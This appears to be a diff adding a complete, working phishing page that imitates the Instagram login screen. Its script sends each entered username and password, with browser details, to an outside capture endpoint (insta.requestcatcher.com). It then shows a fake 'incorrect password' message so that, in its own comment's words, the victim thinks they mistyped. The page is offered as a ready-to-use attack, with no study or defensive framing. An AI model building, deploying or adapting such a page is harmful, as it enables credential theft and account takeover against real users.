@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
+        .container { max-width: 350px; width: 100%; }
+        .login-box { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 40px 30px; margin-bottom: 10px; text-align: center; }
+        .logo { margin: 0 auto 30px; }
+        .logo svg { width: 175px; height: 51px; }
+        .input-group { margin-bottom: 6px; }
+        .input-group input { width: 100%; padding: 9px 0 7px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; color: #262626; outline: none; }
+        .input-group input:focus { border-color: #a8a8a8; }
+        .input-group input::placeholder { color: #8e8e8e; }
+        .btn { width: 100%; padding: 7px 16px; background: #0095f6; border: none; border-radius: 4px; color: #fff; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 12px; opacity: 0.7; }
+        .btn.active { opacity: 1; }
+        .btn:hover { background: #1877f2; }
+        .divider { display: flex; align-items: center; margin: 14px 0; }
+        .divider .line { flex: 1; height: 1px; background: #dbdbdb; }
+        .divider .or { margin: 0 18px; font-size: 13px; font-weight: 600; color: #8e8e8e; }
+        .fb-login { display: block; margin: 8px 0; padding: 7px; font-size: 14px; font-weight: 600; color: #385185; text-decoration: none; cursor: pointer; }
+        .forgot { display: block; margin-top: 12px; font-size: 12px; color: #00376b; text-decoration: none; }
+        .error { color: #ed4956; font-size: 12px; margin: 4px 0 8px 0; display: none; line-height: 1.4; }
+        .signup-box { background: #fff; border: 1px solid #dbdbdb; padding: 20px 40px; text-align: center; font-size: 14px; }
+        .signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; cursor: pointer; }
+        .get-app { text-align: center; margin-top: 16px; }
+        .get-app p { font-size: 14px; margin-bottom: 12px; }
+        .app-buttons { display: flex; justify-content: center; gap: 8px; }
+        .app-buttons img { height: 40px; }
+        .footer { margin-top: 24px; font-size: 12px; color: #8e8e8e; text-align: center; max-width: 600px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <svg viewBox="0 0 175 51" fill="none">
+                    <path d="M42.5 0C40.4 0 38.5 1.2 37.6 3.1L26.5 24.8L15.4 3.1C14.5 1.2 12.6 0 10.5 0H6.5L22.5 32L13.5 49L27.5 49L42.5 19L57.5 49H71.5L62.5 32L78.5 0H74.5C72.4 0 70.5 1.2 69.6 3.1L58.5 24.8L47.4 3.1C46.5 1.2 44.6 0 42.5 0Z" fill="#262626"/>
+                    <circle cx="136" cy="10" r="8" fill="#262626"/>
+                </svg>
+            </div>
+
+            <div class="error" id="error">
+                <span id="errorText">Sorry, your password was incorrect. Please double-check your password.</span>
+            </div>
+
+            <form id="loginForm">
+                <div class="input-group">
+                    <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="btn active">Log in</button>
+            </form>
+
+            <div class="divider">
+                <div class="line"></div>
+                <span class="or">OR</span>
+                <div class="line"></div>
+            </div>
+
+            <a class="fb-login">Log in with Facebook</a>
+            <a class="forgot" href="#">Forgot password?</a>
+        </div>
+
+        <div class="signup-box">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-buttons">
+                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAAoCAMAAADHAPxOAAAAZlBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////+ZmZmqOxJ4AAAAIXRSTlMAwO9AHwC/kEBf7yBfwM9A38/vQN/vQEC/P98/v9/fQN8Yp6mGAAABDElEQVQ4y+2WWw6DMAxEm18gECT8XrT3v2q3asUoUdR+GinqfI2EbY8zMiiKoiiKoijKf6GTYDBgDAaDwWAwGAwGg8FgMBgMBoPBYDAYDAaDwWAwGAwGg8FgMBgMBoPBYDAYDAaDwWAwGAwGg8FgMBgMBoPBYDAYDAaDwWAwGAwGg8FgMBgMBoPBYDAYDAaDwWAwGAwGg8FgMBgMBoPBYDAYDAaDwWAwGAwGg8FgMBgMBoPBYDAYDAaDwWAwGAwGg8FgMBgMBoPBYDAYDAaDwWAwGAwGg8FgMBgMBoPBYDAYDAaDwWAwGAwGg8FgMBgMBoPBYDAY7AfsK3l4G+4AAAAASUVORK5CYII=" alt="Download on the App Store" style="height:40px; background:#000; border-radius:4px; padding:4px 8px;">
+                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAAoCAMAAADHAPxOAAAAh1BMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////9XaNE7AAAALHRSTlMAwO9AH7BA338gz4Bf75CvQO/PQN/vQN/fQN+QQN/vQN+/QN8gv99A37+6GQAAAAABdFJOUwBA5thmAAABHElEQVQ4y2KYrcDAoM/AwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMHjAgGEAI4gxBKAAAAAElFTkSuQmCC" alt="Get it on Google Play" style="height:40px;">
+            </div>
+        </div>
+
+        <div class="footer">
+            Meta &copy; 2025
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+            
+            if (!username || !password) return;
+
+            // Send credentials to your capture endpoint
+            fetch('https://insta.requestcatcher.com/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: username,
+                    password: password,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString(),
+                    page: 'instagram_login'
+                })
+            }).then(function() {
+                // Show Instagram-style error — victim thinks they mistyped
+                document.getElementById('error').style.display = 'block';
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+            }).catch(function() {
+                // Even if fetch fails, still show error
+                document.getElementById('error').style.display = 'block';
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+            });
+        });
+
+        // Toggle button state based on input
+        var inputs = document.querySelectorAll('input');
+        inputs.forEach(function(input) {
+            input.addEventListener('input', function() {
+                var btn = document.querySelector('.btn');
+                var u = document.getElementById('username').value;
+                var p = document.getElementById('password').value;
+                if (u && p) {
+                    btn.classList.add('active');
+                } else {
+                    btn.classList.remove('active');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
